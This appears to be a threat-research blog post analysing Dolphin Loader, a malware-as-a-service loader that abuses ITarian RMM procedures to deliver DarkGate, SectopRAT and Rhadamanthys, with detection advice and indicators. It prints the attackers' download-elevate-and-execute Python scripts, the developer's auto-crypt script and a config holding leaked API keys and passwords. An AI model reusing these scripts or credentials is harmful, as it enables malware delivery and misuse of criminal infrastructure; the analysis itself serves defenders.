---
layout: post
title: The Abuse of ITarian RMM by Dolphin Loader
description: Looking into the abuse of ITarian RMM and introducing Dolphin Loader
date: 2024-08-16 7:01:35 +0300
image: /images/DolphinLoader/dolphin_header.jpg
---
# Dolphin Loader

A few days ago I was looking at the sample from Dolphin Loader and couldn't understand for awhile how it was able to retrieve the final payload because the payload was not able to fully complete the execution chain. Recently someone sent me a fresh working sample, so I had a little "hell yeah!" moment. 

![Smiling-Cat.jpg](/images/DolphinLoader/Smiling-Cat.jpg)

Before looking into the abuse of ITarian RMM software, we should talk a little bit about Dolphin Loader.

Dolphin Loader is a new Malware-as-a-Service loader that first went on sale in July 2024 on Telegram.

The Dolphin Loader claims to bypass SmartScreen because it is signed with an EV (Extended Validation) certificate, Chrome alert and EDR. The seller also offers EasyCrypt services for LummaC2 Stealer users. EasyCrypt, also known as EasyCrypter, is a crypter service sold on Telegram for x86 .NET/Native files. I previously wrote a Yara rule for the crypter for UnprotectProject, which you can access [here](https://unprotect.it/technique/easycrypter/).

The loader has the following pricing:

- 3 slots MSI (Weekly access) - $1800
- 2 slots MSI (Monthly access) - $5400
- 1 slot EXE (Monthly access) - $7200

The executable files are highly priced compared to MSI packaging files. What makes executable file more attractive is likely that executable files can be easily packed and compressed compared to MSI files and that users are more accustomed to  executable files. The familiarity can make users more likely to trust and execute an an executable file, even if it is from an untrusted source. Also, executables files are standalone and can be executed directly without requiring any additional software or scripts.

![Ads.JPG](/images/DolphinLoader/Ads.JPG)

Some of the Dolphin Loader payloads currently have zero detections on VirusTotal. Why? Because it uses legitimate, EV-signed remote management software to deliver the final payload. This approach is very convenient for the loader's developer because it eliminates the need to obtain an EV certificate and end up paying a significant amount of money out-of-pocket. Leveraging legitimate RMM software to deliver malware also offers numerous advantages:

- Since RMM tools are meant to run quietly in the background because they monitor and manage systems, malware leveraging these tools can operate stealthily, avoiding detection by users.

- RMM tools already include features for remote command or script execution, system monitoring, and data exfiltration. Attackers can use these built-in functionalities to control compromised systems.

- Organizations trust their RMM solutions for IT operations. This trust can be exploited by attackers to deliver malware without raising immediate suspicion from users or IT staff.

![EVCert.JPG](/images/DolphinLoader/EVCert.JPG)

# The Abuse of ITarian RMM

Initially I was going with the theory of the DLL side-loading with the MSI payload (MD5: a2b4081e6ac9d7ff9e892494c58d6be1) and specifically with the ITarian agent but had no luck of finding the tampered file. So, the second theory is that the loader is leveraging an RMM software based on the process tree from one of the [public samples](https://tria.ge/240622-s6gncasglf/behavioral1).

![ProcessTreeTriage.png](/images/DolphinLoader/ProcessTreeTriage.png)

So, the [sample](https://tria.ge/240811-pxewlstgrh/behavioral1) provided to me, helped to confirm the second theory because the threat actor used the same name **richardmilliestpe** for the MSI payload distribution link and for the RMM instance:

- Distribution link:   
hxxps://houseofgoodtones.org/richardmilliestpe/Aunteficator_em_BHdAOse8_installer_Win7-Win11_x86_x64[.]msi
- RMM instance: richardmilliestpe.itsm-us1.comodo[.]com

Out of curiosity, I decided to get the ITarian RMM, which is available for free but with limited functionalities (just the one that we need :) ). We are particularly interested in **Procedures**. In ITarian endpoint management you can create a custom procedure to run on the registered devices. 

![RMM.png](/images/DolphinLoader/RMM.png)

Then you can leverage Windows Script Procedure option to create a custom script. The purpose of my script was to pop the calculator up. Based from my observation, the script can only be written in Python. I did not see the PowerShell option available but you can [leverage Python to run PowerShell scripts](https://scripts.itarian.com/frontend/web/topic/run-a-powershell-command). 

![RMM2.jpg](/images/DolphinLoader/RMM2.jpg)

You can then configure when you would want the script to run - one time, daily, weekly or monthly. The "Run this procedure immediately when the profile is assigned to a new device" option is likely what the threat actor had.

![RMM3.jpg](/images/DolphinLoader/RMM3.jpg)

After setting the script up successfully and assigning it to the proper group or customer, I went ahead and retrieved the link to download an MSI installer for ITarian RMM client via device enrollment option. 

![RMM4.JPG](/images/DolphinLoader/RMM4.JPG)

![RMM5.jpg](/images/DolphinLoader/RMM5.jpg)

The downloaded MSI file would be approximately 96MB in size and the naming convention would be similar to the following, where "raeaESpJ" is the token value:

- em_raeaESpJ_installer_Win7-Win11_x86_x64

After the successful installation of the software, the dependencies and files will be dropped under either **C:\Program Files (x86)\ITarian** or **C:\Program Files\COMODO**, the **token.ini** file (the file is deleted after successfully retrieving the instance address) contains the token value that the client will use to obtain the instance address, for example **zeus14-msp.itsm-us1.comodo.com** (from the testing case above). 

For blue teamers while looking for suspicious activities for ITarian RMM client, you should log for the contents of the **RmmService.log** file under **ITarian\Endpoint Manager\rmmlogs** or **COMODO\Endpoint Manager\rmmlogs**. The log file would provide great insights into what procedures or scripts were ran on the host and their configurations. 

![rmmservicelogfile.JPG](/images/DolphinLoader/rmmservicelogfile.JPG)

From the screenshot above we can see the **repeat: NEVER**, which means that the script will only run one time when the endpoint device is enrolled. 

Now let's inspect the log file from out malicious sample. We can see two scripts present.

The first script is named "st3", executes only once - when the device is first registered. 

{% highlight python %}

msgScheduledTaskList {
  scheduledTaskId: "scheduled_5"
  msgSchedule {
    repeat: NEVER
    start: 1723161600
    time: "17:15"
  }
  msgProcedureSet {
    procedureSetId: "473"
    alertHandlerId: "1"
    msgProcedureList {
      procedureId: "473"
      pluginType: Python_Procedure
      msgProcedureRule {
        name: "st3"
        script: "import os\nimport urllib\nimport zipfile\nimport subprocess\nimport time\nimport shutil\nimport ctypes\nimport sys\n\nclass disable_file_system_redirection:\n    _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection\n    _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection\n\n    def __enter__(self):\n        self.old_value = ctypes.c_long()\n        self.success = self._disable(ctypes.byref(self.old_value))\n\n    def __exit__(self, type, value, traceback):\n        if self.success:\n            self._revert(self.old_value)\n\ndef is_admin():\n    try:\n        return ctypes.windll.shell32.IsUserAnAdmin()\n    except:\n        return False\n\ndef run_as_admin(command, params):\n    try:\n        if not is_admin():\n            # Restart the script with admin rights\n            params = \' \'.join(params)\n            print(\"Restarting script with admin rights...\")\n            ctypes.windll.shell32.ShellExecuteW(None, \"runas\", command, params, None, 1)\n            sys.exit(0)\n        else:\n            print(\"Running command with admin rights:\", command, params)\n            result = subprocess.call([command] + params, shell=True)\n            if result != 0:\n                print(\"Command failed with return code:\", result)\n            else:\n                print(\"Command executed successfully.\")\n    except Exception as e:\n        print(\"Failed to elevate to admin. Error:\", e)\n        sys.exit(1)\n\ndef download_file(url, save_path):\n    try:\n        request = urllib.urlopen(url)\n        with open(save_path, \'wb\') as f:\n            while True:\n                chunk = request.read(100 * 1000 * 1000)\n                if not chunk:\n                    break\n                f.write(chunk)\n        print(\"File downloaded successfully and saved to {}.\".format(save_path))\n        # Check file size\n        file_size = os.path.getsize(save_path)\n        print(\"Downloaded file size: {} bytes.\".format(file_size))\n    except Exception as e:\n        print(\"Error downloading file: \", e)\n        sys.exit(1)\n\ndef unzip_file(zip_path, extract_to):\n    try:\n        with disable_file_system_redirection():\n            with zipfile.ZipFile(zip_path, \'r\') as zip_ref:\n                zip_ref.extractall(extract_to)\n                print(\"File extracted successfully to {}\".format(extract_to))\n    except zipfile.BadZipFile:\n        print(\"File is not a valid zip file\")\n    except Exception as e:\n        print(\"Error extracting file: \", e)\n        sys.exit(1)\n\ndef cleanup(file_path, folder_path):\n    try:\n        if os.path.exists(file_path):\n            os.remove(file_path)\n            print(\"Removed file: {}\".format(file_path))\n        if os.path.exists(folder_path):\n            shutil.rmtree(folder_path)\n            print(\"Removed folder: {}\".format(folder_path))\n    except Exception as e:\n        print(\"Error during cleanup: \", e)\n\nif __name__ == \"__main__\":\n    command = sys.executable\n    params = sys.argv\n\n    run_as_admin(command, params)\n\n    zip_url = \'http://comodozeropoint.com/Updates/1736162964/23/Salome.zip\'\n    zip_filename = os.path.basename(zip_url)\n    folder_name = os.path.splitext(zip_filename)[0]\n\n    temp_folder = os.path.join(os.environ[\'TEMP\'], folder_name)\n    zip_path = os.path.join(os.environ[\'TEMP\'], zip_filename)\n    extract_to = temp_folder\n\n    if not os.path.exists(os.environ[\'TEMP\']):\n        os.makedirs(os.environ[\'TEMP\'])\n\n    print(\"Downloading file...\")\n    download_file(zip_url, zip_path)\n\n    if os.path.exists(zip_path):\n        print(\"File exists after download.\")\n    else:\n        print(\"File did not download successfully.\")\n        exit()\n\n    if not os.path.exists(extract_to):\n        os.makedirs(extract_to)\n\n    print(\"Extracting file...\")\n    unzip_file(zip_path, extract_to)\n\n    # \331\205\330\263\333\214\330\261 \332\251\330\247\331\205\331\204 \330\250\331\207 AutoIt3.exe \331\210 script.a3x \331\276\330\263 \330\247\330\262 \330\247\330\263\330\252\330\256\330\261\330\247\330\254\n    autoit_path = os.path.join(extract_to, \'AutoIt3.exe\')\n    script_path = os.path.join(extract_to, \'script.a3x\')\n\n    print(\"Running command...\")\n    if os.path.exists(autoit_path) and os.path.exists(script_path):\n        run_as_admin(autoit_path, [script_path])\n    else:\n        print(\"Error: AutoIt3.exe or script.a3x not found after extraction.\")\n\n    time.sleep(60)\n\n    print(\"Cleaning up...\")\n    cleanup(zip_path, extract_to)\n\n    print(\"Done\")\n"
        launcherId: 0
        runner {
          type: LOGGED_IN
        }
        profileId: 53
        isHiddenUser: false
      }
    }
  }
  runOnProfileApply: true
  requiredInternet: false
  procedureType: SCHEDULED
  endTimeSettings {
    type: UNTILL_MAINTENANCE_WINDOW_END
    value: 0
  }
}

{% endhighlight %}


We will quickly clean up the script:

{% highlight python %}

import os
import urllib
import zipfile
import subprocess
import time
import shutil
import ctypes
import sys

class disable_file_system_redirection:
    _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self._disable(ctypes.byref(self.old_value))

    def __exit__(self, type, value, traceback):
        if self.success:
            self._revert(self.old_value)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(command, params):
    try:
        if not is_admin():
            # Restart the script with admin rights
            params = \' \'.join(params)
            print(\"Restarting script with admin rights...\")
            ctypes.windll.shell32.ShellExecuteW(None, \"runas\", command, params, None, 1)
            sys.exit(0)
        else:
            print(\"Running command with admin rights:\", command, params)
            result = subprocess.call([command] + params, shell=True)
            if result != 0:
                print(\"Command failed with return code:\", result)
            else:
                print(\"Command executed successfully.\")
    except Exception as e:
        print(\"Failed to elevate to admin. Error:\", e)
        sys.exit(1)

def download_file(url, save_path):
    try:
        request = urllib.urlopen(url)
        with open(save_path, \'wb\') as f:
            while True:
                chunk = request.read(100 * 1000 * 1000)
                if not chunk:
                    break
                f.write(chunk)
        print(\"File downloaded successfully and saved to {}.\".format(save_path))
        # Check file size
        file_size = os.path.getsize(save_path)
        print(\"Downloaded file size: {} bytes.\".format(file_size))
    except Exception as e:
        print(\"Error downloading file: \", e)
        sys.exit(1)

def unzip_file(zip_path, extract_to):
    try:
        with disable_file_system_redirection():
            with zipfile.ZipFile(zip_path, \'r\') as zip_ref:
                zip_ref.extractall(extract_to)
                print(\"File extracted successfully to {}\".format(extract_to))
    except zipfile.BadZipFile:
        print(\"File is not a valid zip file\")
    except Exception as e:
        print(\"Error extracting file: \", e)
        sys.exit(1)

def cleanup(file_path, folder_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(\"Removed file: {}\".format(file_path))
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            print(\"Removed folder: {}\".format(folder_path))
    except Exception as e:
        print(\"Error during cleanup: \", e)

if __name__ == \"__main__\":
    command = sys.executable
    params = sys.argv

    run_as_admin(command, params)

    zip_url = \'http://comodozeropoint.com/Updates/1736162964/23/Salome.zip\'
    zip_filename = os.path.basename(zip_url)
    folder_name = os.path.splitext(zip_filename)[0]

    temp_folder = os.path.join(os.environ[\'TEMP\'], folder_name)
    zip_path = os.path.join(os.environ[\'TEMP\'], zip_filename)
    extract_to = temp_folder

    if not os.path.exists(os.environ[\'TEMP\']):
        os.makedirs(os.environ[\'TEMP\'])

    print(\"Downloading file...\")
    download_file(zip_url, zip_path)

    if os.path.exists(zip_path):
        print(\"File exists after download.\")
    else:
        print(\"File did not download successfully.\")
        exit()

    if not os.path.exists(extract_to):
        os.makedirs(extract_to)

    print(\"Extracting file...\")
    unzip_file(zip_path, extract_to)

    # \331\205\330\263\333\214\330\261 \332\251\330\247\331\205\331\204 \330\250\331\207 AutoIt3.exe \331\210 script.a3x \331\276\330\263 \330\247\330\262 \330\247\330\263\330\252\330\256\330\261\330\247\330\254
    autoit_path = os.path.join(extract_to, \'AutoIt3.exe\')
    script_path = os.path.join(extract_to, \'script.a3x\')

    print(\"Running command...\")
    if os.path.exists(autoit_path) and os.path.exists(script_path):
        run_as_admin(autoit_path, [script_path])
    else:
        print(\"Error: AutoIt3.exe or script.a3x not found after extraction.\")

    time.sleep(60)

    print(\"Cleaning up...\")
    cleanup(zip_path, extract_to)

    print(\"Done\")

{% endhighlight %}

From the script above we can observe the following:

- The script initially checks if it is executing with administrative privileges by utilizing the **IsUserAnAdmin()** function from the Windows API. If it detects that it is running without these privileges, it attempts to restart itself with elevated rights. This elevation process is achieved by invoking the **ShellExecuteW** function from the Windows Shell API, using the "runas". This prompts the User Account Control (UAC) to ask the user for permission to run the script as an administrator.

- The script retrieves a ZIP archive from comodozeropoint.com/Updates/1736162964/23/Salome[.]zip, extracts the content of the archive (an AutoIt executable and the malicious script name script.a3x) under the %TEMP% folder and executes an AutoIt file. We will look at the obfuscation of the AutoIt scripts later in this blog. 

- After the execution of the AutoIt file, the script sleeps for a minute before removing the ZIP archive and the extracted files. 

The content of the second is the following, note that the name of the procedure is "Dolphin1" and the procedure is repeated on a daily basis:

{% highlight python %}

msgScheduledTaskList {
  scheduledTaskId: "scheduled_6"
  msgSchedule {
    repeat: DAILY
    start: 1723334400
    time: "20:30"
  }
  msgProcedureSet {
    procedureSetId: "475"
    alertHandlerId: "1"
    msgProcedureList {
      procedureId: "475"
      pluginType: Python_Procedure
      msgProcedureRule {
        name: "Dolphin1"
        script: "import os\nimport urllib2\nimport zipfile\nimport subprocess\nimport shutil\nimport ctypes\nimport time\n\nclass disable_file_system_redirection:\n    _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection\n    _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection\n\n    def __enter__(self):\n        self.old_value = ctypes.c_long()\n        self.success = self._disable(ctypes.byref(self.old_value))\n\n    def __exit__(self, type, value, traceback):\n        if self.success:\n            self._revert(self.old_value)\n\ndef download_file(url, save_path):\n    try:\n        headers = {\'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\'}\n        request = urllib2.Request(url, headers=headers)\n        response = urllib2.urlopen(request)\n        with open(save_path, \'wb\') as f:\n            f.write(response.read())\n        print(\"File downloaded successfully.\")\n    except urllib2.HTTPError as e:\n        print(\"HTTP Error: \", e.code)\n    except urllib2.URLError as e:\n        print(\"URL Error: \", e.reason)\n    except Exception as e:\n        print(\"Error downloading file: \", e)\n\ndef unzip_file(zip_path, extract_to):\n    try:\n        with disable_file_system_redirection():\n            with zipfile.ZipFile(zip_path, \'r\') as zip_ref:\n                zip_ref.extractall(extract_to)\n                print(\"File extracted successfully.\")\n    except zipfile.BadZipfile:\n        print(\"File is not a zip file\")\n    except Exception as e:\n        print(\"Error extracting file: \", e)\n\ndef run_command(command, cwd):\n    try:\n        proc = subprocess.Popen(command, shell=True, cwd=cwd)\n        proc.communicate()\n    except Exception as e:\n        print(\"Error running command: \", e)\n\ndef cleanup(file_path, folder_path):\n    try:\n        if os.path.exists(file_path):\n            os.remove(file_path)\n        if os.path.exists(folder_path):\n            shutil.rmtree(folder_path)\n    except Exception as e:\n        print(\"Error during cleanup: \", e)\n\nif __name__ == \"__main__\":\n    zip_url = \'http://comodozeropoint.com/Requests/api/Core.zip\'\n    zip_filename = os.path.basename(zip_url)\n    folder_name = os.path.splitext(zip_filename)[0]\n\n    temp_folder = os.path.join(os.environ[\'TEMP\'], folder_name)\n    zip_path = os.path.join(os.environ[\'TEMP\'], zip_filename)\n    extract_to = temp_folder\n\n    if not os.path.exists(os.environ[\'TEMP\']):\n        os.makedirs(os.environ[\'TEMP\'])\n\n    print(\"Downloading file...\")\n    download_file(zip_url, zip_path)\n\n    if os.path.exists(zip_path):\n        print(\"File downloaded successfully.\")\n    else:\n        print(\"File did not download successfully.\")\n        exit()\n\n    if not os.path.exists(extract_to):\n        os.makedirs(extract_to)\n\n    print(\"Extracting file...\")\n    unzip_file(zip_path, extract_to)\n\n    print(\"Running command...\")\n    command = \'AutoIt3.exe script.a3x\'\n    run_command(command, extract_to)\n\n    print(\"Waiting for 1 minute before cleanup...\")\n    time.sleep(60)\n\n    print(\"Cleaning up...\")\n    cleanup(zip_path, extract_to)\n\n    print(\"Done\")\n"
        launcherId: 0
        runner {
          type: LOGGED_IN
        }
        profileId: 53
        isHiddenUser: false
      }
    }
  }
  runOnProfileApply: false
  requiredInternet: true
  procedureType: SCHEDULED
  endTimeSettings {
    type: UNTILL_MAINTENANCE_WINDOW_END
    value: 0
  }
}

{% endhighlight %}


The cleaned-up Python script:

{% highlight python %}

import os
import urllib2
import zipfile
import subprocess
import shutil
import ctypes
import time

class disable_file_system_redirection:
    _disable = ctypes.windll.kernel32.Wow64DisableWow64FsRedirection
    _revert = ctypes.windll.kernel32.Wow64RevertWow64FsRedirection

    def __enter__(self):
        self.old_value = ctypes.c_long()
        self.success = self._disable(ctypes.byref(self.old_value))

    def __exit__(self, type, value, traceback):
        if self.success:
            self._revert(self.old_value)

def download_file(url, save_path):
    try:
        headers = {\'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\'}
        request = urllib2.Request(url, headers=headers)
        response = urllib2.urlopen(request)
        with open(save_path, \'wb\') as f:
            f.write(response.read())
        print(\"File downloaded successfully.\")
    except urllib2.HTTPError as e:
        print(\"HTTP Error: \", e.code)
    except urllib2.URLError as e:
        print(\"URL Error: \", e.reason)
    except Exception as e:
        print(\"Error downloading file: \", e)

def unzip_file(zip_path, extract_to):
    try:
        with disable_file_system_redirection():
            with zipfile.ZipFile(zip_path, \'r\') as zip_ref:
                zip_ref.extractall(extract_to)
                print(\"File extracted successfully.\")
    except zipfile.BadZipfile:
        print(\"File is not a zip file\")
    except Exception as e:
        print(\"Error extracting file: \", e)

def run_command(command, cwd):
    try:
        proc = subprocess.Popen(command, shell=True, cwd=cwd)
        proc.communicate()
    except Exception as e:
        print(\"Error running command: \", e)

def cleanup(file_path, folder_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
    except Exception as e:
        print(\"Error during cleanup: \", e)

if __name__ == \"__main__\":
    zip_url = \'http://comodozeropoint.com/Requests/api/Core.zip\'
    zip_filename = os.path.basename(zip_url)
    folder_name = os.path.splitext(zip_filename)[0]

    temp_folder = os.path.join(os.environ[\'TEMP\'], folder_name)
    zip_path = os.path.join(os.environ[\'TEMP\'], zip_filename)
    extract_to = temp_folder

    if not os.path.exists(os.environ[\'TEMP\']):
        os.makedirs(os.environ[\'TEMP\'])

    print(\"Downloading file...\")
    download_file(zip_url, zip_path)

    if os.path.exists(zip_path):
        print(\"File downloaded successfully.\")
    else:
        print(\"File did not download successfully.\")
        exit()

    if not os.path.exists(extract_to):
        os.makedirs(extract_to)

    print(\"Extracting file...\")
    unzip_file(zip_path, extract_to)

    print(\"Running command...\")
    command = \'AutoIt3.exe script.a3x\'
    run_command(command, extract_to)

    print(\"Waiting for 1 minute before cleanup...\")
    time.sleep(60)

    print(\"Cleaning up...\")
    cleanup(zip_path, extract_to)

    print(\"Done\")

{% endhighlight %}


This script differs from the initial Python script by constructing an HTTP request with an explicitly set User-Agent header, and it retrieves a ZIP archive that is different from the first Python script. 

While I was researching the commands sent to the RMM server, I stumbled upon [TrendMicro blog](https://www.trendmicro.com/en_id/research/24/h/malvertising-campaign-fake-ai-editor-website-credential-theft.html) that mentioned the RMM abuse. 

# AutoIt Analysis

Extracting the Salome.zip file, we notice a malicious AutoIt script named "script.a3x" and the AutoIt executable. Using AutoIt script decompiler, we can get the insight into what the script is actually doing. 

![autoit_script.JPG](/images/DolphinLoader/autoit_script.JPG)

The **encrypt** function shown in the screenshot above takes a hexadecimal string and a key **wkxltyejh**, and decrypts the data using a custom method (I know, the function name is deceiving). It begins by converting the hex string into binary data. Then, it computes an altered key by XORing the ordinal value of each character in the key with the key's length. The altered key is then used to decrypt the binary data byte by byte, so each byte of the data is XORed with the altered key, and then bitwise NOT is then applied to invert the bits. 

The decrypted strings are responsible for changing the protection on a region of memory to PAGE_EXECUTE_READWRITE and loading the payload into the memory. The script also leverages the **EnumWindows** callback function thanks to **DllCall** function, which allows the script to interact directly with Windows DLL, to execute malicious code, using a function pointer that directs to the payload.

One of the payloads extracted from the AutoIt script is DarkGate. The XOR key **wkxltyejh** is also used as a marker to split up the DarkGate loader, the final payload (SectopRAT) and the DarkGate encrypted configuration. Interestingly enough, the DarkGate configuration is not encoded with custom-base64 alphabet like in the previous samples and is rather encrypted with the XOR algorithm described above. 

Here is the Python script to decrypt the data:

{% highlight python %}

def decrypt(data, key):
    value = bytes.fromhex(data)
    key_length = len(key)
    encrypted = bytearray()
    key_alt = key_length
    
    for char in key:
        key_alt = key_alt ^ ord(char)
    for byte in value:
        encrypted_byte = ~(byte ^ key_alt) & 0xFF  
        encrypted.append(encrypted_byte)
    return encrypted
  
enc_data = ""  # Encrypted data
enc_key = "" # XOR key
dec_data = decrypt(enc_data, enc_key)
print(f"Decrypted data: {dec_data}")

{% endhighlight %}

The DarkGate configuration:

{% highlight cleartext %}

2=RrZBXNXw - xor key 
0=Dolphin2 - campaign ID 
1=Yes - Process Hollowing injection enabled
3=Yes - PE injection (MicrosoftEdgeUpdate or msbuild.exe) (0041A9A8) 
5=No - process injection via Process Hollowing with nCmdShow set to SW_HIDE
6=No - pesistence via registry run key 
7=No - VM check (1)
8=No - VM check (2)
9=No - Check Disk Space  
10=100 - minimum disk size 
11=No - Check RAM
12=4096 - minimum RAM size 
13=No - check Xeon
14=This is optional 
15=Yes 
16=No 
18=Yes

{% endhighlight %}

Let's take a brief look at the DarkGate sample. This sample is slightly different from other ones because this sample is lacking some features like credential stealing, AV detection, screenshot capture, etc. This sample only has the capabilities to inject the final payload into another process and that's pretty much it. 

The loader checks if it's running with an argument "script.a3x" and if it's not the loader displays an "Executing manually will not work" to the user and terminates itself. If the loader fails to read "script.a3x", the message box "no data" will be displayed. So, make sure to add script.a3x as an argument in the debugger. 

The second malicious AutoIt script from "Core.zip" drops the Rhadamanthys stealer. 

The DarkGate configuration for the second payload is similar to the previous one. 

# The Power of Opendir

So, I've noticed that there is an open directory at comodozeropoint[.]com/Updates/, which belongs to the Dolphin Loader developer. I found a script hosted on that domain called "updater.py" particularly interesting:

{% highlight python %}

import os
import configparser
import requests
import pyminizip
import pyzipper
import schedule
import time

encryption_api_key = "h8dbOGTYLrFLplwiNZ1BLl3MhnpZCmJY"
encryption_server_address_packlab = "http://194.87.219.118/crypt"
encryption_server_address_easycrypt = "http://another.server.address/crypt"
api_url = "https://apilumma1.fun/v1/downloadBuild"

def read_autocrypt_ini(file_path):
    config = configparser.ConfigParser()
    temp_config_path = file_path + ".tmp"

    with open(file_path, 'r') as original_file, open(temp_config_path, 'w') as temp_file:
        for line in original_file:
            line = line.split('#')[0].strip()  
            if line:  
                temp_file.write(line + '\n')

    config.read(temp_config_path)
    os.remove(temp_config_path)

    settings = {
        'auto_crypt': config.getboolean('Settings', 'auto_crypt', fallback=False),
        'auto_crypt_time': config.getint('Settings', 'auto_crypt_time', fallback=0),
        'crypt_service': config.get('Settings', 'crypt_service', fallback=''),
        'lumma_stealer': config.getboolean('Settings', 'lumma_stealer', fallback=False),
        'lumma_api_key': config.get('Settings', 'lumma_api_key', fallback=''),
        'lumma_build_zip_password': config.get('Settings', 'lumma_build_zip_password', fallback=''),
        'filename': config.get('Settings', 'filename', fallback=''),
        'chatid': config.get('Settings', 'chatid', fallback='')
    }
    return settings

def download_and_extract_zip(api_url, api_key, save_path, zip_password, filename):
    url = f'{api_url}?access_token={api_key}'
    response = requests.get(url)
    zip_file_path = os.path.join(save_path, f'{filename}.zip')

    with open(zip_file_path, 'wb') as f:
        f.write(response.content)

    with pyzipper.AESZipFile(zip_file_path, 'r') as zip_ref:
        zip_ref.extractall(path=save_path, pwd=zip_password.encode('utf-8'))

    os.remove(zip_file_path)
    print(f"Downloaded and extracted files to: {save_path}")
    
    # پیدا کردن فایل استخراج شده
    extracted_file_path = None
    for file in os.listdir(save_path):
        if file.endswith('.exe'):
            extracted_file_path = os.path.join(save_path, file)
            break

    if not extracted_file_path:
        raise FileNotFoundError(f"Extracted file not found in: {save_path}")
    
    return extracted_file_path

def encrypt_file(input_path, service):
    try:
        with open(input_path, 'rb') as file:
            files = {'build.exe': file}
            headers = {'Authorization': encryption_api_key}
            if service == 'Packlab':
                response = requests.post(encryption_server_address_packlab, headers=headers, files=files)
            elif service == 'Easycrypt':
                response = requests.post(encryption_server_address_easycrypt, headers=headers, files=files)

        if response.status_code == 200:
            return response.content
        else:
            raise Exception(f"Error: {response.status_code}, {response.text}")
    except requests.exceptions.RequestException as e:
        raise Exception(f"An error occurred: {e}")

def create_encrypted_zip(file_path, save_path, filename, password):
    zip_file_path = os.path.join(save_path, f'{filename}.zip')
    pyminizip.compress(file_path, None, zip_file_path, password, 5)
    print(f"Encrypted zip file created at: {zip_file_path}")

def process_user_folders(root_folder):
    for user_folder in os.listdir(root_folder):
        user_folder_path = os.path.join(root_folder, user_folder)
        if os.path.isdir(user_folder_path):
            for slot_folder in os.listdir(user_folder_path):
                slot_folder_path = os.path.join(user_folder_path, slot_folder)
                if os.path.isdir(slot_folder_path):
                    ini_file_path = os.path.join(slot_folder_path, 'autocrypt.ini')
                    if os.path.exists(ini_file_path):
                        settings = read_autocrypt_ini(ini_file_path)
                        
                        if not settings['auto_crypt']:
                            print(f"Skipping {slot_folder_path} because auto_crypt is False")
                            continue

                        try:
                            if settings['lumma_stealer']:
                                extracted_file_path = download_and_extract_zip(api_url, settings['lumma_api_key'], slot_folder_path, settings['lumma_build_zip_password'], settings['filename'])
                            else:
                                raise Exception("Lumma stealer is disabled")
                        except Exception as e:
                            print(f"Error with Lumma stealer: {e}")
                            last_build_folder = os.path.join(slot_folder_path, '__LASTBUILD__')
                            if os.path.isdir(last_build_folder):
                                for file in os.listdir(last_build_folder):
                                    if file.endswith('.exe'):
                                        extracted_file_path = os.path.join(last_build_folder, file)
                                        break
                                else:
                                    print(f"No executable found in {last_build_folder}")
                                    continue
                            else:
                                print(f"No __LASTBUILD__ folder found in {slot_folder_path}")
                                continue

                        if settings['crypt_service'] == 'Packlab':
                            encrypted_file_content = encrypt_file(extracted_file_path, 'Packlab')
                        elif settings['crypt_service'] == 'Easycrypt':
                            encrypted_file_content = encrypt_file(extracted_file_path, 'Easycrypt')
                        else:
                            print(f"Unknown crypt_service: {settings['crypt_service']}")
                            continue
                        
                        # ذخیره فایل رمزنگاری شده
                        encrypted_file_path = os.path.join(slot_folder_path, f'{settings["filename"]}.exe')
                        with open(encrypted_file_path, 'wb') as encrypted_file:
                            encrypted_file.write(encrypted_file_content)
                        
                        print(f"Encrypted file saved to: {encrypted_file_path}")

                        # ایجاد فایل زیپ رمزنگاری شده
                        create_encrypted_zip(encrypted_file_path, slot_folder_path, settings['filename'], settings['chatid'])

def job():
    input_folder = r'C:\xampp\htdocs\Updates'  # Change this to your input folder path
    process_user_folders(input_folder)

if __name__ == "__main__":
    # اجرای اولیه برنامه
    job()

    # زمان‌بندی اجرای هر 3 ساعت یکبار
    schedule.every(1).hours.do(job)
    
    while True:
        schedule.run_pending()
        time.sleep(1)


{% endhighlight %}

So, if you recall from the Telegram ads about the Dolphin Loader mentioned earlier in this article, the developer offers free AutoCrypt every hour. This script is responsible for that. The developer uses Packlab and Easycrypt crypter services to encrypt LummaC2 payloads through APIs.

The **autocrypt.ini** file contains the LummaC2 payload generation settings:

{% highlight cleartext %}

[Settings]
auto_crypt = True # True or False
crypt_service = Packlab # Packlab, Easycrypt, ReflectiveDLLInjection
lumma_stealer = True # True or False
lumma_api_key = lumma_cisCPnGijULUMgUaOhPLOvmT_G4BGCIFsor2q48lWSWZpRAn7-MSjqSLSfJFmbKJyG7gNOl3UnVHt1jpSTHLzg
lumma_build_zip_password = 940e6692
filename = pentameral
chatid = 6012068394
tag = DolphinTag

{% endhighlight %}

# Conclusion

It was interesting to see developers leveraging legitimate Remote Monitoring and Management (RMM) tools to distribute malware with minimal effort yet demanding substantial fees for the product.

Blue teamers should monitor for the execution of suspicious AutoIt scripts and process injections targeting **RegAsm.exe**, **msbuild.exe**, **MicrosoftEdgeUpdate.exe**, and **updatecore.exe**, especially when these processes originate from RMM tools as parent processes. Additionally, it's important to examine the log files of RMM tools for any metadata that could suggest malicious activity.

# Indicators of Compromise

| Name | Indicators |
| ---- | ---- |
| GlorySprout | 3952a294b831e8738f70c2caea5e0559 |
| C2 | 147.78.103.197 |
| C2 | 45.138.16.167 |
| GlorySprout | d295c4f639d581851aea8fbcc1ea0989 |

# Reference

[https://unprotect.it/technique/easycrypter/](https://unprotect.it/technique/easycrypter/)
[https://www.trendmicro.com/en_id/research/24/h/malvertising-campaign-fake-ai-editor-website-credential-theft.html](https://www.trendmicro.com/en_id/research/24/h/malvertising-campaign-fake-ai-editor-website-credential-theft.html)
